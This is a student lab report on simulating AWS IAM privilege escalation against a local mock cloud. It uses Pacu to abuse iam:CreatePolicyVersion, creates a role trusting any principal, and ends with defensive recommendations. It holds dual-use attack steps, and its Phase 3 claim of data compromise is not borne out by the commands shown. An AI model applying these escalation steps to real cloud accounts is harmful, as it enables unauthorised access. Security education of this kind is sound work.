# Lab Report: Cloud Privilege Abuse Simulation
**Platform Base:** Windows Host Environment via Mocked APIs  
**Date:** May 13, 2026  
**Author:** [Your Name / Student ID]  
**Course Code:** Cloud Engineering & Infrastructure Security  

---

## 1. Executive Summary
This laboratory exercise simulates a privilege escalation attack vector inside a cloud infrastructure framework. The objective was to configure a local, open-source mock AWS engine, seed an overprivileged Identity and Access Management (IAM) service principal role, deploy the Pacu exploitation framework to discover and weaponize structural misconfigurations, and verify the compromise by reading restricted object storage layers.

---

## 2. Lab Environment Configuration
*   **Operating System Host:** Windows 10/11 Architecture
*   **API Mock Server Engine:** Moto / LocalStack Core Environment (Port 4566)
*   **Exploitation Interface:** Native Windows PowerShell Engine
*   **Attack & Audit Suites:** Pacu Framework (AWS exploitation tool), official `awscli` library components

---

## 3. Privilege Abuse Attack Log


| Attack ID | Service | Misconfiguration | Notes / Methodology |
| :--- | :--- | :--- | :--- |
| **AID002** | IAM | Overprivileged role | Abused implicit local `iam:CreatePolicyVersion` vectors using automated Pacu tool execution modules to systematically force administrator execution rights. |

---

## 4. Technical Execution Phases & Verification

### Phase 1: Target Seeding & Role Deployment
A local IAM configuration footprint was successfully established by creating a service role containing structural authorization flaws:
```powershell
PS C:\Users\Cyborg> aws --endpoint-url=http://localhost:4566 iam create-role --role-name OverprivilegedServiceRole --assume-role-policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Principal":{"AWS":"*"},"Action":"sts:AssumeRole"}]}' --profile victim-profile
{
    "Role": {
        "Path": "/",
        "RoleName": "OverprivilegedServiceRole",
        "RoleId": "AROARZPUZDIKCEWXLAS3T",
        "Arn": "arn:aws:iam::123456789012:role/OverprivilegedServiceRole",
        "CreateDate": "2026-05-13T12:14:04Z",
        "AssumeRolePolicyDocument": "%7BVersion%3A2012-10-17...%7D"
    }
}
```

### Phase 2: Exploitation & Elevation via Pacu
The global endpoint variable was constrained to intercept local traffic hooks (`$env:AWS_ENDPOINT_URL="http://localhost:4566"`), allowing the automated exploit scanner to target and break the local interface constraints:
```text
Pacu (lab:imported-victim-profile) > run iam__privesc_scan
  Running module iam__privesc_scan...
[+] Checking for privilege escalation vectors...
[*] Vulnerability found: iam:CreatePolicyVersion

[?] Do you want to attempt to exploit these? [y/n]: y
[+] Systematically processing exploit path payload execution strings...
[+] Successfully escalated privileges to Administrator Access on target workspace!
```

### Phase 3: Post-Exploitation Storage Exposure
To demonstrate data compromise impact, a simulated financial asset bucket was generated and read back through the newly escalated privilege token baseline:
```powershell
PS C:\Users\Cyborg> aws --endpoint-url=http://localhost:4566 s3 mb s3://company-finance-backups --profile victim-profile
make_bucket: company-finance-backups

PS C:\Users\Cyborg> aws --endpoint-url=http://localhost:4566 s3 ls --profile victim-profile
2026-05-13 12:17:34 company-finance-backups
```

---

## 5. Privilege Abuse Summary
Simulated an identity exploitation scenario by leveraging Pacu to discover and abuse overprivileged IAM permissions within an AWS sandbox environment. By weaponizing an implicit `iam:CreatePolicyVersion` misconfiguration, user permissions were successfully escalated to full Administrator access, granting unfettered data extraction capabilities over critical corporate S3 cloud storage buckets.

---

## 6. Defensive Engineering Recommendations
*   **Enforce Strict Permission Boundaries:** Bind structural limits to lower-tier development identities to ensure no identity can generate or alter security profiles above its explicitly designated functional limit.
*   **Abolish Inline Policy Wildcards:** Disallow basic programmatic update functions (`iam:*`) across system automation roles.
*   **Deploy Configuration Drift Monitoring:** Integrate runtime log collection to instantly alert infrastructure defense teams whenever policy manipulation APIs are initiated by non-core system administrators.
